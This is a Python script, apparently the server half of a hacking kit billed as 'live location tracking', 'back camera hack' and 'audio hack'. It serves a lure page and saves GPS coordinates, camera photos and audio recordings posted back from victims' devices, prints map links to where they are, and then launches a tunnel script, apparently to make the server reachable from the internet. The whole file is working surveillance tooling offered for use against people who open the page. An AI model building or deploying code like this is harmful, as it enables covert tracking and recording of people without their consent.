import os, json, base64, time
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import subprocess
os.system("figlet zyphorix")
print('''
*live location tracking
*back camera hack
*audio hack

maked by zyphorix
''')



UPLOAD_DIR = os.path.expanduser("~/tracker/data")
os.makedirs(UPLOAD_DIR, exist_ok=True)

class H(BaseHTTPRequestHandler):
    def _send(self, code, content, ctype='text/html'):
        self.send_response(code)
        self.send_header('Content-Type', ctype)
        self.end_headers()
        self.wfile.write(content.encode() if isinstance(content, str) else content)

    def do_GET(self):
        if self.path == '/':
            with open('index.html') as f: self._send(200, f.read())
        else: self._send(404, 'Not Found')

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        entry = json.loads(data)
        entry['timestamp'] = datetime.now().isoformat()
        did = entry.get('id', 'unknown')

        if self.path == '/location':
            with open(f'{UPLOAD_DIR}/locations.jsonl', 'a') as f:
                f.write(json.dumps(entry) + '\n')
            lat = entry.get('lat')
            lon = entry.get('lon')
            acc = entry.get('acc', '?')
            gmap = f"https://www.google.com/maps?q={lat},{lon}"
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [{did}] LOC {lat},{lon} ±{acc}m")
            print(f"           MAP: {gmap}")

        elif self.path == '/photo':
            img = base64.b64decode(entry['image'])
            fname = f"photo_{int(time.time())}.jpg"
            with open(f'{UPLOAD_DIR}/{fname}', 'wb') as f: f.write(img)
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [{did}] IMG {fname}")

        elif self.path == '/audio':
            audio = base64.b64decode(entry['audio'])
            fname = f"audio_{int(time.time())}.webm"
            with open(f'{UPLOAD_DIR}/{fname}', 'wb') as f: f.write(audio)
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [{did}] AUD {fname}")

        self._send(200, 'OK', 'text/plain')

    def log_message(self, *args): pass

if __name__ == '__main__':
    print("Server on :8080  |  Data -> ~/tracker/data/")
    HTTPServer(('0.0.0.0', 8080), H).serve_forever()
    
os.system("python tunnel.py")
